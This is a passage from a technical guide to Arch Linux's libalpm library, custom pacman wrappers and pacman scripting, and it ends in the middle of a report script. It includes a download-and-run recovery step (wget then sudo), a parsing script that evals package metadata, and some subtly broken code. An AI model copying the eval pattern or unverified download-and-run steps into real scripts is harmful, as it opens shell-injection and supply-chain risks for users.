# Pacman Development

## Libalpm Library Understanding

### What is libalpm?

**libalpm** (Arch Linux Package Management) is the core shared library that provides all package management functionality for Arch Linux. Pacman is simply a front-end command-line interface to this library, not a standalone package manager.

**Key concept:** Since pacman version 3.0.0, pacman has been the official front-end to libalpm, which means the library handles all the actual package management operations while pacman provides the user interface.

### Architecture and Design

#### Library vs Frontend Model

**libalpm (backend):**
- Shared C library (`libalpm.so`)
- Handles all package management operations
- Database manipulation
- Dependency resolution
- File operations
- Signature verification
- Repository management

**pacman (frontend):**
- Command-line interface to libalpm
- Parses user commands and options
- Calls appropriate libalpm functions
- Displays formatted output to users
- Handles interactive prompts

**This separation allows:**
- Alternative front-ends to be written
- Different user interfaces (CLI, GUI, TUI)
- Tools to use package management functionality programmatically
- Language bindings for other programming languages

### Core Functionality

#### Library Components

**Handle management:**
- Initialize and release libalpm instances
- Configure library behavior
- Set options and paths

**Database operations:**
- Open and query package databases
- Local database (`/var/lib/pacman/local/`)
- Sync databases (repository databases)
- Database integrity verification

**Package operations:**
- Install packages
- Remove packages
- Upgrade packages
- Query package information
- Extract package metadata

**Transaction management:**
- Prepare transactions
- Commit transactions
- Rollback on errors
- Conflict resolution

**Dependency resolution:**
- Calculate dependency trees
- Resolve conflicts
- Handle optional dependencies
- Provider selection

**File operations:**
- Download files from mirrors
- Verify checksums
- Extract archives
- Install files to filesystem

**Signature verification:**
- PGP signature checking
- Keyring management
- Trust verification

### Library Interface

#### Main API Categories

**Handle functions:**
```c
alpm_initialize()     // Initialize library
alpm_release()        // Clean up and release
```

**Database functions:**
```c
alpm_register_syncdb()    // Register repository
alpm_db_get_pkg()         // Get package from database
alpm_db_search()          // Search database
```

**Package functions:**
```c
alpm_pkg_load()           // Load package file
alpm_pkg_get_name()       // Get package name
alpm_pkg_get_version()    // Get package version
alpm_pkg_download_size()  // Get download size
```

**Transaction functions:**
```c
alpm_trans_init()         // Initialize transaction
alpm_trans_prepare()      // Prepare transaction
alpm_trans_commit()       // Commit transaction
alpm_trans_release()      // Release transaction
```

**Options:**
```c
alpm_option_set_root()        // Set installation root
alpm_option_set_dbpath()      // Set database path
alpm_option_set_cachedir()    // Set cache directory
```

### Tools Built on libalpm

#### Official and Popular Tools

**Official frontend:**
- **pacman** - Command-line package manager

**Alternative frontends:**
- **pamac** - GUI package manager (used by Manjaro)
- **packagekit** - Cross-distro package management system

**AUR helpers using libalpm:**
- **yay** - Uses Go bindings (go-alpm)
- **paru** - Uses Rust bindings (alpm.rs)
- **pikaur** - Uses Python bindings (pyalpm)

**Utility tools:**
- **expac** - Data extraction tool for alpm databases
- **pacutils** - Collection of libalpm utilities
- **paccat** - Cat files from repositories
- **pac-tree** - Dependency tree viewer
- **arch-audit** - Security vulnerability checker

### Language Bindings

Different programming languages can interface with libalpm through bindings:

**Python - pyalpm:**
```python
import pyalpm
handle = pyalpm.Handle("/", "/var/lib/pacman")
db = handle.register_syncdb("core", 0)
pkg = db.get_pkg("firefox")
print(pkg.version)
```

**Rust - alpm.rs:**
```rust
use alpm::Alpm;
let alpm = Alpm::new("/", "/var/lib/pacman").unwrap();
let db = alpm.register_syncdb("core", 0).unwrap();
```

**Go - go-alpm:**
```go
import "github.com/Jguer/go-alpm"
h, _ := alpm.Initialize("/", "/var/lib/pacman")
defer h.Release()
```

### Library Files and Locations

#### System Files

**Shared library:**
```
/usr/lib/libalpm.so.15      # Current version (symlink)
/usr/lib/libalpm.so.15.0.0  # Actual library file
```

**Version numbering:** The `.15` indicates the library ABI version. When pacman updates with breaking API changes, this number increments.

**Header files:**
```
/usr/include/alpm.h
/usr/include/alpm_list.h
```

**Documentation:**
```
man libalpm
man libalpm_list
```

### Practical Implications

#### For Users

**Understanding pacman's architecture:**
- Pacman is just one possible interface to libalpm
- Package operations happen at the library level
- All frontends ultimately use the same core functionality

**Broken library issues:**
If libalpm is corrupted or deleted:
```
pacman: error while loading shared libraries: libalpm.so.15: cannot open shared object file
```

**Recovery:** Use pacman-static (statically linked pacman that doesn't depend on libalpm.so):
```
wget https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -S pacman
```

#### For Developers

**Building custom tools:**
- Link against libalpm for package management functionality
- Access package databases programmatically
- Create custom package managers or utilities
- Automate package operations

**Advantages:**
- Well-documented C API
- Stable interface
- Used by production tools
- Language bindings available

### Configuration

#### Library Configuration Sources

**libalpm reads from:**
- `/etc/pacman.conf` - Main configuration
- `/etc/pacman.d/` - Repository and mirror configuration
- Environment and runtime options

**Configuration options affect:**
- Database paths
- Cache directories
- Repository URLs
- Download settings
- Signature verification
- Architecture

### Database Structure

#### libalpm Database Organization

**Local database:**
```
/var/lib/pacman/local/
├── package-name-version/
│   ├── desc          # Package description
│   ├── files         # File list
│   └── mtree         # File metadata
```

**Sync databases:**
```
/var/lib/pacman/sync/
├── core.db           # Symlink to versioned database
├── extra.db
└── multilib.db
```

**libalpm operations:**
- Parses database files
- Caches information in memory
- Provides query interface
- Maintains database consistency

### Best Practices

#### Understanding the Stack

**Layered architecture:**
1. **libalpm** - Core library (C)
2. **Language bindings** - Python/Rust/Go wrappers (optional)
3. **Frontend** - pacman, yay, paru, GUI tools
4. **User** - Commands and interactions

**Troubleshooting tip:** Issues can occur at any layer. Understanding which component is responsible helps diagnose problems.

#### When Building Custom Tools

**Use libalpm when:**
- Building package management tools
- Automating package queries
- Creating alternative interfaces
- Developing system management utilities

**Consider existing tools when:**
- Basic operations suffice
- Don't need programmatic access
- Standard pacman meets needs

### Version Compatibility

#### ABI Stability

**Library versions:**
- libalpm maintains ABI compatibility within major versions
- Breaking changes increment the SO version (e.g., .14 → .15)
- Tools must rebuild when ABI version changes

**Example compatibility issue:**
```
yay: error while loading shared libraries: libalpm.so.14: cannot open shared object file
```

This occurs when yay was built against libalpm.so.14 but system has libalpm.so.15.

**Solution:** Rebuild the tool:
```
yay -S yay --rebuild
```

### Summary

**libalpm** is the foundational library powering all package management on Arch Linux. Understanding it helps users:
- Comprehend how pacman actually works
- Troubleshoot library-related issues
- Understand why AUR helpers and alternative tools exist
- Appreciate the modular design of Arch's package management

**Key takeaway:** Pacman is not the package manager—libalpm is. Pacman is simply the official command-line interface to the libalpm library, which handles all the actual package management operations.

Sources
[1] libalpm(3) - Arch manual pages https://man.archlinux.org/man/libalpm.3
[2] alpm based tools - ArchWiki https://wiki.archlinux.org/title/Alpm_based_tools
[3] Package manager : r/archlinux - Reddit https://www.reddit.com/r/archlinux/comments/12mre48/package_manager/
[4] [Solved] Libalpm as a Library / Pacman & Package Upgrade Issues ... https://bbs.archlinux.org/viewtopic.php?id=257222
[5] How To Fix Broken Pacman In Arch Linux - OSTechNix https://ostechnix.com/fix-broken-pacman-arch-linux/
[6] pacman(8) https://pacman.archlinux.page/pacman.8.html
[7] yay 12.4.1 still fails with "error while loading shared libraries - GitHub https://github.com/Jguer/yay/issues/2508
[8] Debian -- Details of package libalpm15 in forky https://packages.debian.org/testing/libs/libalpm15
[9] libalpm - Fedora Packages https://packages.fedoraproject.org/pkgs/pacman/libalpm/

## Custom Wrapper Development

### Overview

Custom wrappers around pacman or libalpm allow you to extend functionality, automate workflows, enforce policies, or create specialized package management interfaces tailored to specific needs. Wrappers can range from simple shell scripts to complex programs using libalpm bindings.

### Wrapper Types

#### Script-Based Wrappers

**Shell script wrappers:**
- Easiest to create and maintain
- Execute pacman commands with added logic
- Good for automation and safety checks
- No compilation required

**Use cases:**
- Safety checks before updates
- Automated maintenance routines
- Custom search/install workflows
- Logging and auditing

#### Programming Language Wrappers

**Python/Ruby/Perl wrappers:**
- More sophisticated logic
- Better error handling
- Integration with other tools
- Still call pacman or use bindings

**Use cases:**
- Complex decision making
- Database queries
- Integration with monitoring systems
- Cross-tool coordination

#### Native libalpm Applications

**C/C++/Rust/Go programs:**
- Direct libalpm library usage
- Maximum performance
- Full control over operations
- Requires compilation

**Use cases:**
- Alternative package managers
- System management tools
- Performance-critical applications
- Full-featured frontends

### Simple Shell Script Wrapper

#### Basic Safety Wrapper

```bash
#!/bin/bash
# /usr/local/bin/safe-pac
# Safe wrapper around pacman with pre-checks

set -euo pipefail

# Configuration
MIN_DISK_SPACE=5242880  # 5GB in KB
ARCH_NEWS_URL="https://archlinux.org/news/"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Functions
info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

success() {
    echo -e "${GREEN}✓${NC} $1"
}

warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

error() {
    echo -e "${RED}✗${NC} $1"
}

# Check if running as root for operations that need it
needs_root() {
    case "$1" in
        -S*|--sync|-R*|--remove|-U|--upgrade)
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

# Pre-flight checks
pre_flight_checks() {
    info "Running pre-flight checks..."
    
    # Check disk space
    FREE_SPACE=$(df / | tail -1 | awk '{print $4}')
    if [ $FREE_SPACE -lt $MIN_DISK_SPACE ]; then
        error "Insufficient disk space: $(numfmt --to=iec-i --suffix=B $((FREE_SPACE * 1024)))"
        error "Required: 5GB"
        exit 1
    fi
    success "Disk space OK: $(numfmt --to=iec-i --suffix=B $((FREE_SPACE * 1024)))"
    
    # Check network (for sync operations)
    if [[ "$*" =~ -S.*y ]]; then
        if ping -c 1 -W 2 archlinux.org &>/dev/null; then
            success "Network connectivity OK"
        else
            error "No network connection"
            exit 1
        fi
    fi
    
    # Remind about Arch news for system upgrades
    if [[ "$*" =~ -Syu ]]; then
        warning "Remember to check Arch news: $ARCH_NEWS_URL"
        read -p "Have you checked for manual interventions? (y/n): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            error "Please check Arch news before proceeding"
            exit 1
        fi
    fi
    
    echo
}

# Main execution
if [ $# -eq 0 ]; then
    error "No arguments provided"
    echo "Usage: safe-pac [pacman options]"
    exit 1
fi

# Check if root is needed
if needs_root "$1"; then
    if [ "$EUID" -ne 0 ]; then
        error "This operation requires root privileges"
        exec sudo "$0" "$@"
    fi
fi

# Run pre-flight checks for certain operations
case "$1" in
    -Syu*|--sync*upgrade*)
        pre_flight_checks "$@"
        ;;
esac

# Execute pacman
info "Executing: pacman $*"
pacman "$@"
EXIT_CODE=$?

# Post-execution checks
if [ $EXIT_CODE -eq 0 ]; then
    success "Operation completed successfully"
    
    # Check for failed services after upgrade
    if [[ "$*" =~ -Syu ]]; then
        FAILED=$(systemctl --failed --no-legend | wc -l)
        if [ $FAILED -gt 0 ]; then
            warning "$FAILED services failed after upgrade"
            systemctl --failed
        fi
    fi
else
    error "Operation failed with exit code $EXIT_CODE"
fi

exit $EXIT_CODE
```

**Installation:**
```bash
sudo install -m 755 safe-pac /usr/local/bin/
```

**Usage:**
```bash
safe-pac -Syu           # System upgrade with checks
safe-pac -S firefox     # Install package
safe-pac -Ss search     # Search (no root needed)
```

### Advanced Shell Wrapper with Logging

```bash
#!/bin/bash
# /usr/local/bin/pac-wrapper
# Advanced pacman wrapper with logging and hooks

# Configuration
LOG_DIR="/var/log/pac-wrapper"
HOOK_DIR="/etc/pac-wrapper/hooks"
CONFIG_FILE="/etc/pac-wrapper/config"

# Create necessary directories
mkdir -p "$LOG_DIR" "$HOOK_DIR"

# Load configuration
if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
fi

# Logging function
log_operation() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_file="$LOG_DIR/$(date +%Y%m).log"
    echo "[$timestamp] $USER: pacman $*" >> "$log_file"
}

# Run hooks
run_hooks() {
    local hook_type="$1"
    shift
    
    if [ -d "$HOOK_DIR/$hook_type" ]; then
        for hook in "$HOOK_DIR/$hook_type"/*; do
            if [ -x "$hook" ]; then
                "$hook" "$@"
            fi
        done
    fi
}

# Main execution
log_operation "$@"

# Run pre-hooks
run_hooks "pre" "$@"

# Execute pacman
pacman "$@"
EXIT_CODE=$?

# Run post-hooks
if [ $EXIT_CODE -eq 0 ]; then
    run_hooks "post-success" "$@"
else
    run_hooks "post-failure" "$@"
fi

exit $EXIT_CODE
```

**Hook example - backup before upgrade:**
```bash
#!/bin/bash
# /etc/pac-wrapper/hooks/pre/backup.sh

if [[ "$*" =~ -Syu ]]; then
    BACKUP_DIR="/backup/pre-upgrade"
    mkdir -p "$BACKUP_DIR"
    
    TIMESTAMP=$(date +%Y%m%d-%H%M%S)
    tar -czf "$BACKUP_DIR/etc-$TIMESTAMP.tar.gz" /etc 2>/dev/null
    
    echo "Backup created: $BACKUP_DIR/etc-$TIMESTAMP.tar.gz"
fi
```

### Python Wrapper Using pyalpm

```python
#!/usr/bin/env python3
# custom-pm.py - Custom package manager using pyalpm

import pyalpm
import argparse
import sys
from pathlib import Path

class CustomPackageManager:
    def __init__(self):
        self.handle = pyalpm.Handle("/", "/var/lib/pacman")
        self.setup_databases()
    
    def setup_databases(self):
        """Register sync databases"""
        for repo in ["core", "extra", "multilib"]:
            try:
                self.handle.register_syncdb(repo, 0)
            except pyalpm.error:
                pass
    
    def search(self, query):
        """Search for packages"""
        results = []
        
        # Search in sync databases
        for db in self.handle.get_syncdbs():
            for pkg in db.search(query):
                results.append({
                    'name': pkg.name,
                    'version': pkg.version,
                    'description': pkg.desc,
                    'repo': db.name
                })
        
        return results
    
    def get_package_info(self, pkg_name):
        """Get detailed package information"""
        # Try sync databases first
        for db in self.handle.get_syncdbs():
            pkg = db.get_pkg(pkg_name)
            if pkg:
                return {
                    'name': pkg.name,
                    'version': pkg.version,
                    'description': pkg.desc,
                    'url': pkg.url,
                    'licenses': pkg.licenses,
                    'depends': pkg.depends,
                    'optdepends': pkg.optdepends,
                    'size': pkg.size,
                    'isize': pkg.isize,
                    'repo': db.name
                }
        
        # Try local database
        localdb = self.handle.get_localdb()
        pkg = localdb.get_pkg(pkg_name)
        if pkg:
            return {
                'name': pkg.name,
                'version': pkg.version,
                'description': pkg.desc,
                'install_date': pkg.installdate,
                'install_reason': 'explicit' if pkg.reason == 0 else 'dependency',
                'size': pkg.isize
            }
        
        return None
    
    def list_installed(self):
        """List all installed packages"""
        localdb = self.handle.get_localdb()
        packages = []
        
        for pkg in localdb.pkgcache:
            packages.append({
                'name': pkg.name,
                'version': pkg.version,
                'description': pkg.desc
            })
        
        return sorted(packages, key=lambda x: x['name'])
    
    def check_updates(self):
        """Check for available updates"""
        updates = []
        localdb = self.handle.get_localdb()
        
        for local_pkg in localdb.pkgcache:
            for db in self.handle.get_syncdbs():
                sync_pkg = db.get_pkg(local_pkg.name)
                if sync_pkg and pyalpm.vercmp(sync_pkg.version, local_pkg.version) > 0:
                    updates.append({
                        'name': local_pkg.name,
                        'current': local_pkg.version,
                        'available': sync_pkg.version,
                        'repo': db.name
                    })
                    break
        
        return updates

def main():
    parser = argparse.ArgumentParser(description='Custom package manager')
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Search command
    search_parser = subparsers.add_parser('search', help='Search for packages')
    search_parser.add_argument('query', help='Search query')
    
    # Info command
    info_parser = subparsers.add_parser('info', help='Show package information')
    info_parser.add_argument('package', help='Package name')
    
    # List command
    list_parser = subparsers.add_parser('list', help='List installed packages')
    
    # Updates command
    updates_parser = subparsers.add_parser('updates', help='Check for updates')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    pm = CustomPackageManager()
    
    if args.command == 'search':
        results = pm.search(args.query)
        for pkg in results:
            print(f"{pkg['repo']}/{pkg['name']} {pkg['version']}")
            print(f"    {pkg['description']}")
    
    elif args.command == 'info':
        info = pm.get_package_info(args.package)
        if info:
            for key, value in info.items():
                print(f"{key}: {value}")
        else:
            print(f"Package '{args.package}' not found")
    
    elif args.command == 'list':
        packages = pm.list_installed()
        for pkg in packages:
            print(f"{pkg['name']} {pkg['version']}")
    
    elif args.command == 'updates':
        updates = pm.check_updates()
        if updates:
            print(f"{len(updates)} updates available:")
            for upd in updates:
                print(f"{upd['name']}: {upd['current']} -> {upd['available']}")
        else:
            print("System is up to date")

if __name__ == '__main__':
    main()
```

**Installation:**
```bash
sudo pacman -S python-pyalpm
sudo install -m 755 custom-pm.py /usr/local/bin/custom-pm
```

**Usage:**
```bash
custom-pm search firefox
custom-pm info firefox
custom-pm list
custom-pm updates
```

### Interactive Wrapper with TUI

```bash
#!/bin/bash
# /usr/local/bin/pac-tui
# Interactive pacman wrapper using dialog

check_dialog() {
    if ! command -v dialog &>/dev/null; then
        echo "Error: dialog is required"
        echo "Install with: sudo pacman -S dialog"
        exit 1
    fi
}

show_menu() {
    choice=$(dialog --clear --title "Pacman Wrapper" \
        --menu "Choose an operation:" 15 50 6 \
        1 "Update system" \
        2 "Search packages" \
        3 "Install package" \
        4 "Remove package" \
        5 "List installed" \
        6 "Exit" \
        2>&1 >/dev/tty)
    
    echo "$choice"
}

update_system() {
    dialog --title "System Update" --yesno "Update system?" 7 40
    if [ $? -eq 0 ]; then
        clear
        sudo pacman -Syu
        read -p "Press Enter to continue..."
    fi
}

search_packages() {
    query=$(dialog --inputbox "Enter search query:" 8 40 2>&1 >/dev/tty)
    if [ -n "$query" ]; then
        results=$(pacman -Ss "$query" 2>&1)
        dialog --title "Search Results" --msgbox "$results" 20 70
    fi
}

install_package() {
    pkg=$(dialog --inputbox "Enter package name:" 8 40 2>&1 >/dev/tty)
    if [ -n "$pkg" ]; then
        clear
        sudo pacman -S "$pkg"
        read -p "Press Enter to continue..."
    fi
}

remove_package() {
    pkg=$(dialog --inputbox "Enter package name:" 8 40 2>&1 >/dev/tty)
    if [ -n "$pkg" ]; then
        clear
        sudo pacman -Rns "$pkg"
        read -p "Press Enter to continue..."
    fi
}

list_installed() {
    packages=$(pacman -Q)
    dialog --title "Installed Packages" --msgbox "$packages" 20 70
}

# Main loop
check_dialog

while true; do
    choice=$(show_menu)
    
    case $choice in
        1) update_system ;;
        2) search_packages ;;
        3) install_package ;;
        4) remove_package ;;
        5) list_installed ;;
        6) clear; exit 0 ;;
        *) clear; exit 0 ;;
    esac
done
```

### Policy Enforcement Wrapper

```bash
#!/bin/bash
# /usr/local/bin/policy-pac
# Pacman wrapper with policy enforcement

# Policy configuration
ALLOWED_USERS=("admin" "maintainer")
BLACKLIST_PACKAGES=("dangerous-pkg" "unwanted-tool")
REQUIRE_APPROVAL_SIZE=104857600  # 100MB
APPROVAL_EMAIL="admin@example.com"

# Check if user is allowed
check_user_permission() {
    local current_user=$(whoami)
    
    for user in "${ALLOWED_USERS[@]}"; do
        if [ "$current_user" == "$user" ]; then
            return 0
        fi
    done
    
    echo "Error: User $current_user not authorized for package operations"
    logger -p user.warning "Unauthorized package operation attempt by $current_user"
    return 1
}

# Check for blacklisted packages
check_blacklist() {
    for pkg in "$@"; do
        for blocked in "${BLACKLIST_PACKAGES[@]}"; do
            if [ "$pkg" == "$blocked" ]; then
                echo "Error: Package '$pkg' is blacklisted"
                logger -p user.warning "Attempt to install blacklisted package: $pkg by $(whoami)"
                return 1
            fi
        done
    done
    return 0
}

# Check package size and require approval
check_size_approval() {
    local total_size=0
    
    # Get download size
    for pkg in "$@"; do
        size=$(pacman -Si "$pkg" 2>/dev/null | grep "Download Size" | awk '{print $4}')
        # Convert to bytes (simplified)
        total_size=$((total_size + size))
    done
    
    if [ $total_size -gt $REQUIRE_APPROVAL_SIZE ]; then
        echo "Warning: Total download size exceeds policy limit"
        echo "Size: $(numfmt --to=iec $total_size)"
        echo "Approval required from $APPROVAL_EMAIL"
        return 1
    fi
    
    return 0
}

# Main execution
if [[ "$1" =~ ^-S ]]; then
    check_user_permission || exit 1
    
    # Extract package names
    packages=()
    for arg in "$@"; do
        if [[ ! "$arg" =~ ^- ]]; then
            packages+=("$arg")
        fi
    done
    
    if [ ${#packages[@]} -gt 0 ]; then
        check_blacklist "${packages[@]}" || exit 1
        check_size_approval "${packages[@]}" || exit 1
    fi
fi

# Log operation
logger -p user.info "Package operation by $(whoami): pacman $*"

# Execute pacman
exec pacman "$@"
```

### Best Practices for Wrapper Development

#### Design Principles

**Transparency:**
- Make it clear the wrapper is being used
- Show underlying pacman commands
- Don't hide important information

**Safety:**
- Validate inputs
- Check prerequisites
- Handle errors gracefully
- Provide rollback options

**Logging:**
- Log all operations
- Include timestamps and users
- Maintain audit trail

**Performance:**
- Minimize overhead
- Don't slow down normal operations
- Cache when appropriate

#### Error Handling

```bash
# Good error handling example
execute_pacman() {
    local exit_code
    
    pacman "$@" 2>&1 | tee -a "$LOG_FILE"
    exit_code=${PIPESTATUS[0]}
    
    if [ $exit_code -ne 0 ]; then
        error "Pacman operation failed with exit code $exit_code"
        # Notification
        notify-send -u critical "Package Operation Failed" "Check logs: $LOG_FILE"
        # Email alert
        echo "Operation failed: pacman $*" | mail -s "Pacman Failure" "$ADMIN_EMAIL"
    fi
    
    return $exit_code
}
```

#### Configuration Management

```bash
# Configuration file example
# /etc/pac-wrapper/config

# Logging
LOG_ENABLED=true
LOG_DIR="/var/log/pac-wrapper"

# Safety checks
CHECK_DISK_SPACE=true
MIN_DISK_SPACE=5368709120  # 5GB

# Network
CHECK_CONNECTIVITY=true
TIMEOUT=5

# Notifications
NOTIFY_ON_ERROR=true
NOTIFY_ON_SUCCESS=false
ADMIN_EMAIL="admin@example.com"

# Hooks
ENABLE_HOOKS=true
HOOK_DIR="/etc/pac-wrapper/hooks"
```

#### Testing

```bash
# Test script for wrapper
#!/bin/bash

test_wrapper() {
    echo "Testing wrapper functionality..."
    
    # Test search (read-only)
    ./pac-wrapper -Ss test >/dev/null 2>&1
    [ $? -eq 0 ] && echo "✓ Search works" || echo "✗ Search failed"
    
    # Test query (read-only)
    ./pac-wrapper -Q >/dev/null 2>&1
    [ $? -eq 0 ] && echo "✓ Query works" || echo "✗ Query failed"
    
    # Test invalid operation
    ./pac-wrapper --invalid-flag >/dev/null 2>&1
    [ $? -ne 0 ] && echo "✓ Error handling works" || echo "✗ Error handling failed"
}

test_wrapper
```

Custom wrappers extend pacman's functionality while maintaining compatibility with the underlying system, enabling customization for specific workflows, security requirements, or organizational

## Scripting with Pacman

### Overview

Scripting with pacman enables automation of package management tasks, batch operations, and integration with other tools. Understanding pacman's command-line interface and output formats is essential for reliable scripts.

### Query Operations (Safe for Scripting)

#### Listing Packages

**List all installed packages:**
```bash
pacman -Q
```

Output format:
```
package-name version
firefox 120.0-1
linux 6.6.1.arch1-1
```

**List with full paths:**
```bash
pacman -Ql package-name
```

**Count installed packages:**
```bash
pacman -Q | wc -l
```

**Get specific package version:**
```bash
pacman -Q | grep "^firefox"
# Output: firefox 120.0-1
```

#### Querying Package Information

**Get package version:**
```bash
pacman -Q firefox | awk '{print $2}'
# Output: 120.0-1
```

**Check if package is installed:**
```bash
if pacman -Q firefox >/dev/null 2>&1; then
    echo "Firefox is installed"
else
    echo "Firefox is not installed"
fi
```

**List package dependencies:**
```bash
pacman -Qi firefox | grep "Depends On"
```

**List packages installed as dependencies:**
```bash
pacman -Qd
```

**List explicitly installed packages:**
```bash
pacman -Qe
```

**List foreign packages (AUR):**
```bash
pacman -Qm
```

#### Searching

**Search repositories:**
```bash
pacman -Ss firefox
```

**Search installed packages:**
```bash
pacman -Qs firefox
```

**Search by file:**
```bash
pacman -F /usr/bin/firefox
```

**Find package providing command:**
```bash
pacman -F firefox
```

### Scripting Patterns

#### Safe Query Script

```bash
#!/bin/bash
# query-packages.sh - Safe script to query packages

# Function to get package version
get_version() {
    local pkg="$1"
    pacman -Q "$pkg" 2>/dev/null | awk '{print $2}'
}

# Function to check if installed
is_installed() {
    local pkg="$1"
    pacman -Q "$pkg" >/dev/null 2>&1
}

# Function to list package files
list_files() {
    local pkg="$1"
    pacman -Ql "$pkg" 2>/dev/null | awk '{print $2}'
}

# Function to check if package is dependency
is_dependency() {
    local pkg="$1"
    pacman -Q "$pkg" >/dev/null 2>&1 || return 1
    
    local reason=$(pacman -Qi "$pkg" | grep "Install Reason" | awk '{print $3}')
    [ "$reason" == "Dependency" ] && return 0 || return 1
}

# Example usage
PACKAGE="firefox"

if is_installed "$PACKAGE"; then
    VERSION=$(get_version "$PACKAGE")
    echo "$PACKAGE version: $VERSION"
    
    if ! is_dependency "$PACKAGE"; then
        echo "$PACKAGE is explicitly installed"
    fi
fi
```

#### Package Comparison Script

```bash
#!/bin/bash
# compare-versions.sh - Compare package versions

compare_versions() {
    local pkg="$1"
    local local_version=$(pacman -Q "$pkg" 2>/dev/null | awk '{print $2}')
    local repo_version=$(pacman -Si "$pkg" 2>/dev/null | grep "Version" | awk '{print $3}')
    
    if [ -z "$local_version" ]; then
        echo "$pkg: Not installed"
        return 1
    fi
    
    if [ -z "$repo_version" ]; then
        echo "$pkg: Not in repositories"
        return 1
    fi
    
    echo "$pkg:"
    echo "  Installed: $local_version"
    echo "  Repository: $repo_version"
    
    # Use vercmp if available
    if command -v vercmp &>/dev/null; then
        case $(vercmp "$local_version" "$repo_version") in
            -1) echo "  Status: Update available" ;;
            0)  echo "  Status: Up to date" ;;
            1)  echo "  Status: Newer than repo" ;;
        esac
    fi
}

# Test
compare_versions "firefox"
compare_versions "linux"
```

### Batch Operations

#### Batch Installation Script

```bash
#!/bin/bash
# batch-install.sh - Install multiple packages with safety checks

# Configuration
PACKAGES=(
    "firefox"
    "thunderbird"
    "vlc"
    "gimp"
    "blender"
)

# Dry run mode
DRY_RUN=false
LOG_FILE="/tmp/batch-install-$(date +%Y%m%d-%H%M%S).log"

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --dry-run) DRY_RUN=true; shift ;;
        *) PACKAGES+=("$1"); shift ;;
    esac
done

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Analyze packages
log "Analyzing packages..."

INSTALL_LIST=()
ALREADY_INSTALLED=()
NOT_FOUND=()

for pkg in "${PACKAGES[@]}"; do
    if pacman -Q "$pkg" >/dev/null 2>&1; then
        ALREADY_INSTALLED+=("$pkg")
    elif pacman -Si "$pkg" >/dev/null 2>&1; then
        INSTALL_LIST+=("$pkg")
    else
        NOT_FOUND+=("$pkg")
    fi
done

# Report analysis
log "Analysis results:"
log "  To install: ${#INSTALL_LIST[@]} packages"
log "  Already installed: ${#ALREADY_INSTALLED[@]} packages"
log "  Not found: ${#NOT_FOUND[@]} packages"

# Show details
if [ ${#INSTALL_LIST[@]} -gt 0 ]; then
    log "Packages to install:"
    printf '%s\n' "${INSTALL_LIST[@]}" | while read pkg; do
        log "  - $pkg"
    done
fi

if [ ${#NOT_FOUND[@]} -gt 0 ]; then
    log "Packages not found:"
    printf '%s\n' "${NOT_FOUND[@]}" | while read pkg; do
        log "  - $pkg"
    done
fi

# Proceed with installation if not dry-run
if [ $DRY_RUN = false ] && [ ${#INSTALL_LIST[@]} -gt 0 ]; then
    log "Proceeding with installation..."
    
    sudo pacman -S "${INSTALL_LIST[@]}" --needed
    EXIT_CODE=$?
    
    if [ $EXIT_CODE -eq 0 ]; then
        log "Installation completed successfully"
    else
        log "Installation failed with exit code $EXIT_CODE"
    fi
else
    log "Dry run mode - no changes made"
fi

log "Log saved to: $LOG_FILE"
```

#### Batch Removal Script

```bash
#!/bin/bash
# batch-remove.sh - Remove packages with dependency check

# Packages to remove
PACKAGES=("package1" "package2" "package3")

remove_packages() {
    local packages=("$@")
    
    # Check which packages are installed
    local to_remove=()
    for pkg in "${packages[@]}"; do
        if pacman -Q "$pkg" >/dev/null 2>&1; then
            to_remove+=("$pkg")
        else
            echo "Package '$pkg' not installed, skipping"
        fi
    done
    
    if [ ${#to_remove[@]} -eq 0 ]; then
        echo "No packages to remove"
        return 0
    fi
    
    # Show what will be removed
    echo "Packages to remove:"
    printf '%s\n' "${to_remove[@]}"
    
    # Check dependencies
    echo ""
    echo "Checking dependencies..."
    pacman -Rs "${to_remove[@]}" --print
    
    read -p "Proceed? (y/n): " -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        sudo pacman -Rns "${to_remove[@]}"
    fi
}

remove_packages "${PACKAGES[@]}"
```

### Output Parsing and Processing

#### Parse Package Information

```bash
#!/bin/bash
# parse-packages.sh - Parse and process package information

parse_package_info() {
    local pkg="$1"
    
    pacman -Qi "$pkg" | while IFS=: read -r key value; do
        # Trim whitespace
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Process different fields
        case "$key" in
            "Name")
                echo "name=$value"
                ;;
            "Version")
                echo "version=$value"
                ;;
            "Description")
                echo "description=$value"
                ;;
            "Install Date")
                echo "install_date=$value"
                ;;
            "Install Reason")
                echo "install_reason=$value"
                ;;
            "Depends On")
                echo "dependencies=$value"
                ;;
        esac
    done
}

# Usage
parse_package_info "firefox" | while read line; do
    eval "$line"
done

echo "Firefox version: $version"
echo "Reason: $install_reason"
```

#### Generate Package Report

```bash
#!/bin/bash
# generate-report.sh - Generate system package report

generate_report() {
    local report_file="/tmp/package-report-$(date +%Y%m%d).txt"
    
    {
        echo "=== Arch Linux Package Report ==="
        echo "Generated: $(date)"
        echo ""
        
        # Summary
        echo "=== Summary ==="
        echo "Total installed packages: $(pacman -Q | wc -l)"
        echo "Explicitly installed: $(pacman -Qe | wc -l)"
        echo "Installed as dependencies: $(pacman -Qd | wc -l)"
        echo "Foreign packages (AUR): $(pacman -Qm | wc -l)"
        echo ""
        
        # Recently installed
        echo "=== Recently Installed Packages ==="
        grep "installed" /var/log/pacman.log | tail -10 | awk -F' ' '{print $4}' | sort -u
        echo ""
        
        # Recently updated
        echo "=== Recently Updated Packages ==="
        grep "upgraded" /var/log/pacman.log | tail -10 | awk -F' ' '{print $4}' | sort -u
        echo ""
        
        # Largest packages
